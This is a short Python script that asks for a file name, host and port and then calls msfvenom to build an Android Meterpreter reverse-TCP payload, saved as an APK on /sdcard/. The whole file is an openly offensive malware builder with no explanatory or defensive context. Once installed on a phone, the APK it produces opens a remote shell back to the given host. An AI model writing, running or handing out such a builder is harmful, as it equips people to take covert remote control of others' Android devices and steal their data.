import os 
name = input("NAME APK ?:")
host = input("HOST ?:")
port = input("PORT ?:")
w = "exit"
b = "msfvenom -p android/meterpreter/reverse_tcp lhost="
c = " lport="
f = " -o "
g = ".apk"
h = "/sdcard/"
os.system ( b + host + c + port + f + h + name + g )
print("thanks")
